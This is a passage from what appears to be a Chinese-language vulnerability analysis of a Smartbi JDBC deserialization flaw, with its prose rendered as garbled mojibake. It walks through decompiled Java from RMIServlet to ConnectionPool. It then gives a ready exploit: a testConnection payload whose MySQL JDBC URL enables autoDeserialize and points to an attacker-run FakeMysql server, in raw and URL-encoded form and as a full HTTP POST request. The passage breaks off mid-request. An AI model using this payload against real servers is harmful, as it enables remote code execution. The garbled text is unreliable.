<br></code></pre></td></tr></table></figure><p>æ¥ç€ <code>params</code> è°ƒç”¨ä¸‹é¢çš„æ–¹æ³•ï¼š </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> service.execute(methodName, <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>(params));<br></code></pre></td></tr></table></figure><p><code>execute</code>æ–¹æ³•å¤„ç†é€»è¾‘ï¼šå°†ä¼ å…¥çš„ <code>JSON</code> è½¬ä¸º <code>IDataSource</code> å¯¹è±¡,</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ClientService</span> &#123;<br>    ...<br>    <span class="hljs-comment">//æ¥æ”¶ JSON æ•°ç»„å’Œæ–¹æ³•å</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">execute</span><span class="hljs-params">(String var1, JSONArray var2)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//ä» this.a ä¸­å–å‡ºæ–¹æ³•åå¯¹åº”çš„ Method å¯¹è±¡</span><br>            <span class="hljs-type">Method</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> (Method)<span class="hljs-built_in">this</span>.a.get(var1);<br>            <span class="hljs-comment">//ä¸å­˜åœ¨æŠ›å‡ºå¼‚å¸¸</span><br>            <span class="hljs-keyword">if</span> (var3 == <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">throw</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SmartbiException</span>(CommonErrorCode.METHOD_NAME_ERROR)).setDetail(var1);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">//æ£€æŸ¥å‚æ•°ä¸ªæ•°</span><br>                Class[] var4 = var3.getParameterTypes();<br>                <span class="hljs-keyword">if</span> (var4.length != var2.length()) &#123;<br>                    <span class="hljs-keyword">throw</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SmartbiException</span>(CommonErrorCode.PARAM_COUNT_ERROR)).setDetail(StringUtil.getLanguageValue(<span class="hljs-string">&quot;Method2&quot;</span>) + <span class="hljs-string">&quot;\&quot;&quot;</span> + var1 + <span class="hljs-string">&quot;\&quot;&quot;</span> + StringUtil.getLanguageValue(<span class="hljs-string">&quot;Thenumberofparametersis&quot;</span>) + <span class="hljs-string">&quot; &quot;</span> + var4.length + <span class="hljs-string">&quot; ,&quot;</span> + StringUtil.getLanguageValue(<span class="hljs-string">&quot;Butthenumberofargumentspassedinis&quot;</span>) + <span class="hljs-string">&quot; &quot;</span> + var2.length() + <span class="hljs-string">&quot; .&quot;</span>);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-comment">//åˆ›å»ºJavaç±»å‹å‚æ•°æ•°ç»„</span><br>                    Object[] var5 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[var2.length()];<br><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-comment">//è¿›è¡Œç±»å‹è½¬æ¢ï¼Œå°† JSON -&gt; Javaå¯¹è±¡</span><br>                        <span class="hljs-comment">//è·å–æ¯ä¸ªå‚æ•°çš„æ³›å‹ç±»å‹ï¼ˆvar6ï¼‰</span><br>                        Type[] var6 = var3.getGenericParameterTypes();<br>                        <span class="hljs-comment">//éå† JSON å‚æ•°ï¼Œä½¿ç”¨å·¥å…·ç±» JSONUtil.jsonToObject(...) è½¬ä¸ºç›®æ ‡ç±»å‹</span><br>                        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">var7</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; var7 &lt; var5.length; ++var7) &#123;<br>                            <span class="hljs-comment">//var2 æ˜¯ JSONArrayï¼Œä¹Ÿå°±æ˜¯ä¼ å…¥çš„ params</span><br>                            <span class="hljs-type">Object</span> <span class="hljs-variable">var8</span> <span class="hljs-operator">=</span> var2.get(var7);<br>                            <span class="hljs-comment">//ç›®æ ‡æ–¹æ³• testConnection çš„å‚æ•°ç±»å‹å³ IDataSource</span><br>                            <span class="hljs-type">Class</span> <span class="hljs-variable">var9</span> <span class="hljs-operator">=</span> var4[var7];<br>                            <span class="hljs-comment">//æ³›å‹ç±»å‹</span><br>                            <span class="hljs-type">Type</span> <span class="hljs-variable">var10</span> <span class="hljs-operator">=</span> var6[var7];<br>                            <span class="hljs-comment">//æŠŠ JSON ä¸­çš„ JSONObject è½¬æ¢æˆä¸€ä¸ª Java å¯¹è±¡ï¼ˆvar9 æŒ‡å®šçš„ç±»å‹ï¼‰ï¼Œå¹¶ä½œä¸ºæ–¹æ³•å‚æ•°ä¼ å…¥</span><br>                            var5[var7] = JSONUtil.jsonToObject(var8, var9, var10);<br>                        &#125;<br>                    &#125; <br><br></code></pre></td></tr></table></figure><p>å†è¿›å…¥ <code>DataSourceService.testConnection()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testConnection</span><span class="hljs-params">(IDataSource dataSource)</span> &#123;<br>        MetaDataServiceImpl.getInstance().testConnection(dataSource);<br>    &#125;<br></code></pre></td></tr></table></figure><p>è¿›å…¥ <code>MetaDataServiceImpl.testConnection()</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Java">conn = ConnectionPool.getInstance().getConnection(ds);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MetaDataServiceImpl</span> &#123;<br>    ...<br>    <span class="hljs-comment">//ä¸»è¦æ˜¯å°† IDataSource è½¬æ¢ä¸ºç³»ç»Ÿå†…éƒ¨ DataSource å¯¹è±¡ï¼Œç„¶åå°è¯•å»ºç«‹è¿æ¥</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testConnection</span><span class="hljs-params">(IDataSource dataSource)</span> &#123;<br>    <span class="hljs-comment">//å®ä¾‹åŒ– Smartbi å†…éƒ¨ä½¿ç”¨çš„ DataSource ç±»</span><br>    <span class="hljs-type">DataSource</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataSource</span>();<br>    <span class="hljs-comment">//UUIDGenerator.generate() åº”æ˜¯ä¸€ä¸ªå·¥å…·ç±»ï¼Œç”Ÿæˆéšæœº UUID</span><br>    ds.setId(UUIDGenerator.generate());<br>    <span class="hljs-comment">//æŠŠå¤–éƒ¨ä¼ å…¥çš„ IDataSource è½¬æˆç³»ç»Ÿå†…éƒ¨ DataSourceæ ¼å¼</span><br>    ds.setName(dataSource.getName());<br>    ds.setAlias(dataSource.getAlias());<br>    ds.setDriver(dataSource.getDriver());<br>    ds.setDesc(dataSource.getDesc());<br>    ds.setDbCharset(dataSource.getDbCharset());<br>    ds.setUrl(dataSource.getUrl());<br>    ds.setUser(dataSource.getUser());<br>    ds.setDriverType(dataSource.getDriverType());<br>    ds.setMaxConnection(dataSource.getMaxConnection());<br>    ds.setValidationQuery(dataSource.getValidationQuery());<br>    ds.setPassword(dataSource.getPassword());<br>    ds.setTransactionIsolation(dataSource.getTransactionIsolation());<br>    ds.setValidationQueryMethod(dataSource.getValidationQueryMethod());<br>    ds.setAuthenticationType(dataSource.getAuthenticationType());<br>    <span class="hljs-comment">//å¦‚æœ IDataSource æ²¡æœ‰æä¾›å¯†ç ï¼Œå¹¶ä¸”æä¾›äº† IDï¼Œé‚£ä¹ˆä»æ•°æ®åº“ä¸­æŸ¥è¯¢æ—§æ•°æ®æºä¿¡æ¯ï¼Œå–å‡ºå…¶å¯†ç ï¼Œç”¨äºæœ¬æ¬¡è¿æ¥</span><br>    <span class="hljs-keyword">if</span> (dataSource.getPassword() == <span class="hljs-literal">null</span> &amp;&amp; !StringUtil.isNullOrEmpty(dataSource.getId())) &#123;<br>        <span class="hljs-type">DataSource</span> <span class="hljs-variable">dbDs</span> <span class="hljs-operator">=</span> FreeQueryDAOFactory.getDataSourceDAO().load(dataSource.getId());<br>        ds.setPassword(dbDs.getPassword());<br>    &#125;<br><br>    <span class="hljs-comment">//å£°æ˜ JDBC è¿æ¥å¯¹è±¡ connï¼Œåç»­ç”¨äºå»ºç«‹è¿æ¥</span><br>    <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">//ä½¿ç”¨è‡ªå®šä¹‰çš„è¿æ¥æ±  ConnectionPool è·å–æ•°æ®åº“è¿æ¥</span><br>        conn = ConnectionPool.getInstance().getConnection(ds);<br>        <span class="hljs-keyword">if</span> (DBType.PRESTO == dataSource.getDriverType()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;SELECT 1&quot;</span>;<br>            <span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">stat</span> <span class="hljs-operator">=</span> JdbcUtil.prepareStatement(conn, sql);<br></code></pre></td></tr></table></figure><p>è¿›å…¥ <code>ConnectionPool.getConnection()</code>ï¼šè¿›è¡Œæ•°æ®æ± è¿æ¥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.driverConnect(poolName, ds);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConnectionPool</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    ...<br>    <span class="hljs-keyword">public</span> Connection <span class="hljs-title function_">getConnection</span><span class="hljs-params">(IConnectionInfo ds)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-comment">//åˆ¤æ–­æ˜¯å¦ä¸ºç³»ç»ŸçŸ¥è¯†åº“</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;DS.SYSTEM\u77e5\u8bc6\u5e93&quot;</span>.equals(ds.getId())) &#123;<br>        ds = <span class="hljs-built_in">this</span>.provider.getConnectionInfo(<span class="hljs-string">&quot;res&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//åˆ¤æ–­æ˜¯å¦æ˜¯ JNDI æ•°æ®</span><br>    <span class="hljs-keyword">if</span> (ds.getUrl().startsWith(<span class="hljs-string">&quot;JNDI:&quot;</span>)) &#123;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">cxt</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        <span class="hljs-type">DataSource</span> <span class="hljs-variable">dataSource</span> <span class="hljs-operator">=</span> (DataSource)cxt.lookup(ds.getUrl().substring(<span class="hljs-string">&quot;JNDI:&quot;</span>.length()));<br>        <span class="hljs-keyword">return</span> dataSource.getConnection();<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ds.getValidationQueryMethod() == <span class="hljs-number">3</span>) &#123;<span class="hljs-comment">//åŠ è½½ JDBC é©±åŠ¨</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">driverClass</span> <span class="hljs-operator">=</span> ds.getDriver();<br>        Class&lt;?&gt; clazz = <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//é€šè¿‡è‡ªå®šä¹‰çš„ DynamicLoadLibManager åŠ è½½è¯¥ç±»</span><br>            clazz = DynamicLoadLibManager.loadClass(driverClass);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var12) &#123;<br>            <span class="hljs-comment">//å¦‚æœå¤±è´¥ï¼Œä½¿ç”¨å¤‡ç”¨ classLoader åŠ è½½</span><br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">clzLoader</span> <span class="hljs-operator">=</span> (ClassLoader)Class.forName(<span class="hljs-string">&quot;smartbi.repository.DAOModule&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;classLoader&quot;</span>).get((Object)<span class="hljs-literal">null</span>);<br>            clazz = clzLoader == <span class="hljs-literal">null</span> ? Class.forName(driverClass) : clzLoader.loadClass(driverClass);<br>        &#125;<br>        <br><span class="hljs-comment">//åˆ›å»º JDBC é©±åŠ¨å¯¹è±¡å®ä¾‹</span><br>        <span class="hljs-type">Driver</span> <span class="hljs-variable">jdbcDriver</span> <span class="hljs-operator">=</span> (Driver)clazz.newInstance();<br>        <span class="hljs-comment">//æ„å»ºè¿æ¥æ‰€éœ€çš„å±æ€§ï¼ˆç”¨æˆ·åã€å¯†ç ï¼‰</span><br>        <span class="hljs-type">Properties</span> <span class="hljs-variable">prop</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();<br>        prop.put(<span class="hljs-string">&quot;user&quot;</span>, ds.getUser());<br>        prop.put(<span class="hljs-string">&quot;password&quot;</span>, ds.getPassword());<br>        <span class="hljs-keyword">if</span> (ds.getDriverType() == DBType.KYLIN) &#123;<br>            prop.put(<span class="hljs-string">&quot;timezone&quot;</span>, <span class="hljs-string">&quot;GMT&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//é€šè¿‡åå°„è°ƒç”¨ DriverManager.getConnection() è¿™ä¸ªé‡è½½çš„ç§æœ‰æ–¹æ³•</span><br>            <span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> DriverManager.class.getDeclaredMethod(<span class="hljs-string">&quot;getConnection&quot;</span>, String.class, Properties.class, ClassLoader.class);<br>            m.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-comment">//ä½¿ç”¨ç³»ç»Ÿä¸­çš„ classLoader</span><br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">clzLoader</span> <span class="hljs-operator">=</span> (ClassLoader)Class.forName(<span class="hljs-string">&quot;smartbi.repository.DAOModule&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;classLoader&quot;</span>).get((Object)<span class="hljs-literal">null</span>);<br>            conn = m.invoke((Object)<span class="hljs-literal">null</span>, ds.getUrl(), prop, clzLoader);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var10) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> DriverManager.class.getDeclaredMethod(<span class="hljs-string">&quot;getConnection&quot;</span>, String.class, Properties.class, Class.class);<br>                m.setAccessible(<span class="hljs-literal">true</span>);<br>                conn = m.invoke((Object)<span class="hljs-literal">null</span>, ds.getUrl(), prop, clazz);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception var9) &#123;<br>                conn = DriverManager.getConnection(ds.getUrl(), prop);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> (Connection)conn;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">poolName</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">if</span> (ds.getId().equals(<span class="hljs-string">&quot;DS.SYSTEM\u77e5\u8bc6\u5e93&quot;</span>)) &#123;<br>            poolName = <span class="hljs-string">&quot;res&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            poolName = <span class="hljs-built_in">this</span>.getPoolNameFromDatasource(ds);<br>        &#125;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            driver.getConnectionPool(poolName);<br>            <span class="hljs-comment">//è°ƒç”¨ driverConnect è·å–è¿æ¥æ± è¿æ¥</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.driverConnect(poolName, ds);<br>        &#125; <span class="hljs-keyword">catch</span> (SQLException var11) &#123;<br>            <span class="hljs-built_in">this</span>.createPool(ds);<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.driverConnect(poolName, ds);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ­¤æ—¶æœåŠ¡å™¨å‘è¿œç¨‹çš„<code>FakeMysql</code>å°è¯•è¿æ¥ï¼Œå°±ä¼šæ¥æ”¶åˆ°<code>FakeMysql</code>è¿”å›çš„æ¶æ„åºåˆ—åŒ–æ•°æ®ï¼Œ</p><h3 id="æ¼æ´å¤ç°ï¼š"><a href="#æ¼æ´å¤ç°ï¼š" class="headerlink" title="æ¼æ´å¤ç°ï¼š"></a><strong>æ¼æ´å¤ç°ï¼š</strong></h3><p>æ­å»º FakeMysql æœåŠ¡å™¨ï¼Œç”¨ Javachains æ­å»ºï¼Œå°† 3308ç«¯å£å¼€å¯ï¼Œç›‘å¬çš„æ˜¯<strong>æœ¬æœºIPåœ°å€çš„3308ç«¯å£</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071701134.png" alt="20250806161415587"></p><p>æ„é€  K1é“¾</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071702650.png" alt="20250806162032486"></p><p>æ„é€ poc:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs perl">className=DataSourceService&amp;methodName=testConnection&amp;params=[&#123;<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;maxConnection&quot;</span>:<span class="hljs-number">100</span>,<span class="hljs-string">&quot;user&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;driverType&quot;</span>:<span class="hljs-string">&quot;MYSQL&quot;</span>,<span class="hljs-string">&quot;validationQuery&quot;</span>:<span class="hljs-string">&quot;SELECT 1 FROM DUAL&quot;</span>,<span class="hljs-string">&quot;url&quot;</span>:<span class="hljs-string">&quot;jdbc:mysql://[æœ¬æœºIP]:3308/d4c5846?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>,<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;JDBC&quot;</span>,<span class="hljs-string">&quot;driver&quot;</span>:<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>,<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;desc&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;alias&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;dbCharset&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;identifierQuoteString&quot;</span>:<span class="hljs-string">&quot;`&quot;</span>,<span class="hljs-string">&quot;transactionIsolation&quot;</span>:-<span class="hljs-number">1</span>,<span class="hljs-string">&quot;validationQueryMethod&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;dbToCharset&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;authenticationType&quot;</span>:<span class="hljs-string">&quot;STATIC&quot;</span>&#125;]<br>-&gt;urlç¼–ç <br>className=DataSourceService&amp;methodName=testConnection&amp;params=[&#123;<span class="hljs-string">&quot;password&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;maxConnection&quot;</span><span class="hljs-variable">%3a100</span>,<span class="hljs-string">&quot;user&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;driverType&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;MYSQL&quot;</span>,<span class="hljs-string">&quot;validationQuery&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;SELECT+1+FROM+DUAL&quot;</span>,<span class="hljs-string">&quot;url&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;jdbc%3amysql<span class="hljs-variable">%3a</span>//[æœ¬æœºIP]<span class="hljs-variable">%3a3308</span>/d4c5846%3fautoDeserialize%3dtrue<span class="hljs-variable">%2</span>6statementInterceptors<span class="hljs-variable">%3dcom</span>.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>,<span class="hljs-string">&quot;name&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;JDBC&quot;</span>,<span class="hljs-string">&quot;driver&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>,<span class="hljs-string">&quot;id&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;desc&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;alias&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;dbCharset&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;identifierQuoteString&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;`&quot;</span>,<span class="hljs-string">&quot;transactionIsolation&quot;</span><span class="hljs-variable">%3a</span>-<span class="hljs-number">1</span>,<span class="hljs-string">&quot;validationQueryMethod&quot;</span><span class="hljs-variable">%3a0</span>,<span class="hljs-string">&quot;dbToCharset&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;authenticationType&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;STATIC&quot;</span>&#125;]<br><br><br><br><br>POST /smartbi/vision/RMIServlet HTTP/<span class="hljs-number">1.1</span><br>Host: localhost:<span class="hljs-number">18080</span><br>Upgrade-Insecure-Requests: <span class="hljs-number">1</span><br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">113.0</span><span class="hljs-number">.5672</span><span class="hljs-number">.127</span> Safari/<span class="hljs-number">537.36</span><br>Accept: *<span class="hljs-regexp">/*</span><br><span class="hljs-regexp">Origin: http:/</span><span class="hljs-regexp">/localhost</span><br><span class="hljs-regexp">Referer: http:/</span><span class="hljs-regexp">/localhost:18080/smar</span>tbi/vision/index.jsp<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;<span class="hljs-keyword">q</span>=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br>Cookie: JSESSIONID=0BBBD2EC4AE481FB607FC501FA04897E<br>Content-Type: application/<span class="hljs-keyword">x</span>-www-form-urlencoded;charset=UTF-<span class="hljs-number">8</span><br>Connection : keep-alive<br>Content-Length: <span class="hljs-number">580</span><br><br>className=DataSourceService&amp;methodName=testConnection&amp;params=[&#123;<span class="hljs-string">&quot;password&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;maxConnection&quot;</span><span class="hljs-variable">%3a100</span>,<span class="hljs-string">&quot;user&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;driverType&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;MYSQL&quot;</span>,<span class="hljs-string">&quot;validationQuery&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;SELECT+1+FROM+DUAL&quot;</span>,<span class="hljs-string">&quot;url&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;jdbc%3amysql<span class="hljs-variable">%3a</span>//192.168.1.25<span class="hljs-variable">%3a3308</span>/d4c5846%3fautoDeserialize%3dtrue<span class="hljs-variable">%2</span>6statementInterceptors<span class="hljs-variable">%3dcom</span>.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>,<span class="hljs-string">&quot;name&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;JDBC&quot;</span>,<span class="hljs-string">&quot;driver&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>,<span class="hljs-string">&quot;id&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;desc&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;alias&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;dbCharset&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;identifierQuoteString&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;`&quot;</span>,<span class="hljs-string">&quot;transactionIsolation&quot;</span><span class="hljs-variable">%3a</span>-<span class="hljs-number">1</span>,<span class="hljs-string">&quot;validationQueryMethod&quot;</span><span class="hljs-variable">%3a0</span>,<span class="hljs-string">&quot;dbToCharset&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span 